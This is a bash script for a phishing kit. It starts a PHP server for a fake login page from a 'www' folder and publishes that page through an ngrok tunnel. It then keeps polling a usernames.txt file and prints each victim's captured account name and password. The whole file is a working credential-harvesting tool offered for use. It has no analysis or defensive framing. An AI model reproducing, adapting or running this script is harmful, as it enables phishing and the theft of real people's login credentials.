#!/bin/bash

HOST='127.0.0.1'
PORT='8080'
banner() {
	cat <<- EOF
		▄▄▄· ▪  ▄▄▄▄▄▄▄▄▄· 
		▐█ ▀█▪██ •██  ▐█ ▀█▪
		▐█▀▀█▄▐█· ▐█.▪▐█▀▀█▄
		██▄▪▐█▐█▌ ▐█▌·██▄▪▐█
		·▀▀▀▀ ▀▀▀ ▀▀▀ ·▀▀▀▀ 
	EOF
}
setup_site() {
	echo -ne "\nStarting PHP server..."
	cd www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' www/site/userpass/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' www/site/userpass/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n -> Account : $ACCOUNT"
	echo -e "\n -> Password : $PASSWORD"
	echo -ne "\nWaiting for Next Login Info, Ctrl + C to exit. "
}

capture_data() {
	echo -ne "\nWaiting for Login Info, Ctrl + C to exit..."
	while true; do
		if [[ -e "www/site/userpass/usernames.txt" ]]; then
			echo -e "\n\n# Login info Found !!"
			capture_creds
			rm -rf www/site/userpass/usernames.txt
		fi
		sleep 0.75
	done
}

start_ngrok() {
		echo -e "\nInitializing..."
	{ sleep 1; setup_site; }

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./www/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./www/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner;}
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	echo -e "\nURL : $ngrok_url"
	capture_data
}

start_ngrok